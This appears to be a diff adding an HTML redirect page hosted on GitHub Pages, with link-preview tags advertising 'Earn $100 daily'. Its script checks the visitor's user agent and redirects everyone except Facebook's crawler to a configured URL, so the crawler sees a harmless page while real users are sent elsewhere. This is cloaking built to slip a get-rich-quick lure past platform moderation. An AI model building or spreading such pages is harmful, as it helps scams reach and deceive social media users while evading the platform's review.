@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <script src="config.js"></script>
+  <meta property="og:title" content="Earn $100 daily" />
+  <meta property="og:description" content="Check out this amazing offer and start earning today!" />
+  <meta property="og:image" content="https://i.imghippo.com/files/gbuB7452ddM.png">
+  <meta property="og:url" content="https://rajonbd1.github.io/bestone/" />
+  <title>Redirecting...</title>
+  <script>
+    const ua = navigator.userAgent;
+    const isFacebookCrawler = (
+        ua.includes('facebookexternalhit') ||
+        ua.includes('Facebot') ||
+        ua.includes('facebookplatform')
+    );
+
+    function doRedirect() {
+        window.location.replace(CONFIG.REDIRECT_URL);
+    }
+
+    if (!isFacebookCrawler) {
+        setTimeout(doRedirect, CONFIG.REDIRECT_DELAY_MS);
+    } else {
+        console.log("Facebook crawler detected - no redirect.");
+    }
+
+    
+  </script>
+</head>
+<body>
+  <p>Redirecting you shortly...</p>
+  <img id="displayImage" src="" alt="Display Image" style="max-width: 100%; height: auto; display: block; margin: 20px auto;">
+  <script>
+    document.getElementById('displayImage').src = CONFIG.DISPLAY_IMAGE_URL;
+  </script>
+  </body>
+</html>
